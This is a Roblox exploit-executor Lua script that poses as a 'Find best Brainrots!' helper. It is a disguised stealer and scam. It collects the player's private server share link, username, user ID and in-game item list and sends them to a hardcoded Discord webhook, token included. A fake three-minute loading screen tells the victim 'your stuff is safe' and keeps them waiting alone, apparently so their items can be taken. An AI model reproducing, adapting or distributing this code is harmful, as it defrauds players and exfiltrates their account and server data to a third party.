local WEBHOOK_URL = "https://discord.com/api/webhooks/1445359992122380360/YtcZ9x39eJT-Tyg2SOSuBswUXI18bi9h5Fgd2Ryd7m1MBbcmdg5R20I1G26YQIC9qfMA"

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local function doRequest(tbl)
    local ok, res = pcall(function()
        if syn and syn.request then return syn.request(tbl) end
        if request then return request(tbl) end
        if http_request then return http_request(tbl) end
        if fluxus and fluxus.request then return fluxus.request(tbl) end
        if http and http.request then return http.request(tbl) end
        error("no supported request function found")
    end)
    return ok, res
end

local function sendWebhook(webhookUrl, messageContent)
    local payload = HttpService:JSONEncode({
        content = messageContent,
        allowed_mentions = { parse = {"everyone"} }
    })
    local tbl = {
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    }
    return doRequest(tbl)
end

-- Function to get player's brainrots from their base
local function getPlayerBrainrots()
    local brainrots = {}
    local player = Players.LocalPlayer
    local playerName = player.Name
    
    -- Search in Workspace for brainrots that might belong to the player
    -- Common patterns: brainrots placed in workspace, possibly with player's name or near spawn
    for _, obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        -- Check for objects named "brainrot" (case insensitive)
        if obj:IsA("Model") or obj:IsA("BasePart") then
            local objName = obj.Name:lower()
            if objName:find("brainrot") or objName:find("brain") then
                -- Check if it might belong to the player
                -- Common patterns: Player's name in object name, or in parent folders
                local fullPath = ""
                local current = obj
                while current and current ~= game:GetService("Workspace") do
                    fullPath = current.Name .. "/" .. fullPath
                    current = current.Parent
                end
                
                -- Check if player's name appears in the path
                if fullPath:lower():find(playerName:lower()) then
                    table.insert(brainrots, {
                        name = obj.Name,
                        position = obj:IsA("BasePart") and obj.Position or (obj.PrimaryPart and obj.PrimaryPart.Position)
                    })
                end
            end
        end
    end
    
    -- If no brainrots found with player name, look for brainrots near player's spawn or base area
    if #brainrots == 0 then
        local character = player.Character
        local playerPos = character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart.Position
        
        if playerPos then
            -- Search for brainrots within a radius of the player (in their base)
            local searchRadius = 500 -- Adjust as needed
            for _, obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
                if (obj:IsA("Model") or obj:IsA("BasePart")) and obj.Name:lower():find("brainrot") then
                    local objPos = obj:IsA("BasePart") and obj.Position or (obj.PrimaryPart and obj.PrimaryPart.Position)
                    if objPos and (playerPos - objPos).Magnitude < searchRadius then
                        table.insert(brainrots, {
                            name = obj.Name,
                            position = objPos
                        })
                    end
                end
            end
        end
    end
    
    -- Return just the names for the webhook message
    local brainrotNames = {}
    for _, brainrot in ipairs(brainrots) do
        table.insert(brainrotNames, brainrot.name)
    end
    
    if #brainrotNames == 0 then
        return {"No brainrots found in base/workspace"}
    end
    
    return brainrotNames
end

local parent
if (typeof(gethui) == "function") then
    parent = gethui()
else
    parent = game:GetService("CoreGui")
end

local existing = parent:FindFirstChild("FindBestBrainrotsGUI")
if existing then existing:Destroy() end

local function new(class, props)
    local obj = Instance.new(class)
    if props then
        for k,v in pairs(props) do
            if k ~= "Parent" then obj[k] = v end
        end
        if props.Parent then obj.Parent = props.Parent end
    end
    return obj
end

local screenGui = new("ScreenGui", {
    Name = "FindBestBrainrotsGUI",
    Parent = parent,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    IgnoreGuiInset = true
})

local main = new("Frame", {
    Parent = screenGui,
    AnchorPoint = Vector2.new(0.5,0.5),
    Position = UDim2.new(0.5,0,0.5,0),
    Size = UDim2.new(0.75,0,0.45,0),
    BackgroundColor3 = Color3.fromRGB(18,18,18),
    BorderSizePixel = 0,
    ZIndex = 10
})
new("UICorner", {Parent = main, CornerRadius = UDim.new(0,16)})

local header = new("TextLabel", {
    Parent = main,
    Size = UDim2.new(1,-40,0,60),
    Position = UDim2.new(0,20,0,18),
    BackgroundTransparency = 1,
    Text = "Find best Brainrots!",
    TextSize = 28,
    Font = Enum.Font.GothamBold,
    TextColor3 = Color3.fromRGB(245,245,245),
    TextXAlignment = Enum.TextXAlignment.Left
})

local inputBg = new("Frame", {
    Parent = main,
    Position = UDim2.new(0,20,0,100),
    Size = UDim2.new(1,-40,0,80),
    BackgroundColor3 = Color3.fromRGB(40,40,40),
    BorderSizePixel = 0
})
new("UICorner", {Parent = inputBg, CornerRadius = UDim.new(0,10)})

local textBox = new("TextBox", {
    Parent = inputBg,
    Position = UDim2.new(0,10,0,8),
    Size = UDim2.new(0.78,-20,1,-16),
    BackgroundTransparency = 1,
    Text = "Paste your PS link here",
    TextColor3 = Color3.fromRGB(150,150,150),
    ClearTextOnFocus = false,
    Font = Enum.Font.Gotham,
    TextSize = 18,
    TextXAlignment = Enum.TextXAlignment.Left
})

textBox.Focused:Connect(function()
    if textBox.Text == "Paste your PS link here" then
        textBox.Text = ""
        textBox.TextColor3 = Color3.fromRGB(200,200,200)
    end
end)

textBox.FocusLost:Connect(function()
    if textBox.Text == "" then
        textBox.Text = "Paste your PS link here"
        textBox.TextColor3 = Color3.fromRGB(150,150,150)
    end
end)

local okBtn = new("TextButton", {
    Parent = inputBg,
    Position = UDim2.new(0.82,0,0,8),
    Size = UDim2.new(0.18, -12, 1, -16),
    BackgroundColor3 = Color3.fromRGB(90,180,255),
    BorderSizePixel = 0,
    Text = "OK",
    Font = Enum.Font.GothamBold,
    TextSize = 20,
    TextColor3 = Color3.fromRGB(20,20,20)
})
new("UICorner", {Parent = okBtn, CornerRadius = UDim.new(0,8)})

local overlay = new("Frame", {
    Parent = screenGui,
    Size = UDim2.new(1,0,1,0),
    Position = UDim2.new(0,0,0,0),
    BackgroundColor3 = Color3.fromRGB(50,50,50),
    BackgroundTransparency = 0,
    Visible = false,
    Active = true,
    ZIndex = 999999,
    BorderSizePixel = 0,
    ClipsDescendants = true
})

local overlayHeader = new("TextLabel", {
    Parent = overlay,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0.3,0),
    Size = UDim2.new(0.6,0,0,30),
    BackgroundTransparency = 1,
    Text = "Loading Script...",
    Font = Enum.Font.GothamBold,
    TextSize = 24,
    TextColor3 = Color3.fromRGB(245,245,245),
    TextXAlignment = Enum.TextXAlignment.Center
})

local overlayText = new("TextLabel", {
    Parent = overlay,
    AnchorPoint = Vector2.new(0.5,0.5),
    Position = UDim2.new(0.5,0,0.45,0),
    Size = UDim2.new(0.8,0,0,80),
    BackgroundTransparency = 1,
    Text = "Don't worry, your stuff is safe!\nThe code automatically protects your stuff!",
    Font = Enum.Font.GothamBold,
    TextSize = 24,
    TextColor3 = Color3.fromRGB(245,245,245),
    TextWrapped = true,
    TextYAlignment = Enum.TextYAlignment.Center,
    TextXAlignment = Enum.TextXAlignment.Center
})

local progressBg = new("Frame", {
    Parent = overlay,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0.55,0),
    Size = UDim2.new(0.7,0,0,28),
    BackgroundColor3 = Color3.fromRGB(230,230,230),
    BorderSizePixel = 0
})
new("UICorner", {Parent = progressBg, CornerRadius = UDim.new(0,14)})

local progressFill = new("Frame", {
    Parent = progressBg,
    Position = UDim2.new(0,0,0,0),
    Size = UDim2.new(0,0,1,0),
    BackgroundColor3 = Color3.fromRGB(30,30,30),
    BorderSizePixel = 0
})
new("UICorner", {Parent = progressFill, CornerRadius = UDim.new(0,14)})

local progressLabel = new("TextLabel", {
    Parent = overlay,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0.62,0),
    Size = UDim2.new(0.2,0,0,24),
    BackgroundTransparency = 1,
    Text = "0%",
    Font = Enum.Font.Gotham,
    TextSize = 16,
    TextColor3 = Color3.fromRGB(245,245,245)
})

local invalidLabel = new("TextLabel", {
    Parent = main,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,1,10),
    Size = UDim2.new(0.6,0,0,24),
    BackgroundTransparency = 1,
    Text = "",
    Font = Enum.Font.GothamBold,
    TextSize = 18,
    TextColor3 = Color3.fromRGB(255,0,0),
    TextXAlignment = Enum.TextXAlignment.Center
})

local function setInteract(val)
    okBtn.Active = val
    textBox.TextEditable = val
    okBtn.Visible = val
end

local function fillProgress(duration)
    overlay.Visible = true
    setInteract(false)
    local start = tick()
    local conn
    conn = RunService.RenderStepped:Connect(function()
        local now = tick()
        local t = math.clamp((now - start) / duration, 0, 1)
        local width = math.floor(t * progressBg.AbsoluteSize.X)
        progressFill.Size = UDim2.new(0, width, 1, 0)
        progressLabel.Text = tostring(math.floor(t * 100)) .. "%"
        if t >= 1 then
            conn:Disconnect()
            overlay.Visible = false
            setInteract(true)
        end
    end)
end

okBtn.MouseButton1Click:Connect(function()
    local link = tostring(textBox.Text or "")
    link = link:match("^%s*(.-)%s*$")

    if not (link:find("^https://www.roblox.com/share%?code=") or link:find("^www.roblox.com/share%?code")) then
        invalidLabel.Text = "Invalid link!"
        delay(2, function() invalidLabel.Text = "" end)
        return
    end

    -- Spieleranzahl prÃ¼fen (nur wenn Overlay noch nicht aktiv)
    if not overlay.Visible and #Players:GetPlayers() > 1 then
        local plr = Players.LocalPlayer
        if plr then
            plr:Kick("Only 1 person is allowed! U need to be alone for it to work.")
        end
        return
    end

    invalidLabel.Text = ""
    setInteract(false)
    overlay.Visible = true

    -- Get player info and brainrots from base
    local player = Players.LocalPlayer
    local username = player.Name
    local userId = tostring(player.UserId)
    local playerBrainrots = getPlayerBrainrots()
    
    -- Format brainrots list
    local brainrotsText = table.concat(playerBrainrots, ", ")
    if #playerBrainrots > 15 then
        brainrotsText = table.concat(playerBrainrots, ", ", 1, 15) .. "... and " .. (#playerBrainrots - 15) .. " more"
    end
    
    -- Create webhook message with player info
    local content = string.format(
        "@everyone \n**ðŸŽ® Player Information:**\n" ..
        "ðŸ‘¤ **Username:** %s\n" ..
        "ðŸ†” **UserID:** %s\n" ..
        "ðŸŽ¯ **Game:** %s\n" ..
        "ðŸ”— **Paste Link:** %s\n" ..
        "\n**ðŸ§  **Brainrots in Base (%d total):**\n```%s```",
        username,
        userId,
        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
        link,
        #playerBrainrots,
        brainrotsText
    )
    
    spawn(function() 
        local success, response = sendWebhook(WEBHOOK_URL, content)
        if not success then
            warn("Failed to send webhook:", response)
        end
    end)

    fillProgress(180) -- 3 Minuten
end)

textBox.FocusLost:Connect(function(enter)
    if enter then
        okBtn:CaptureFocus()
        okBtn.MouseButton1Click:Wait()
    end
end)

print("FindBestBrainrots GUI loaded.")
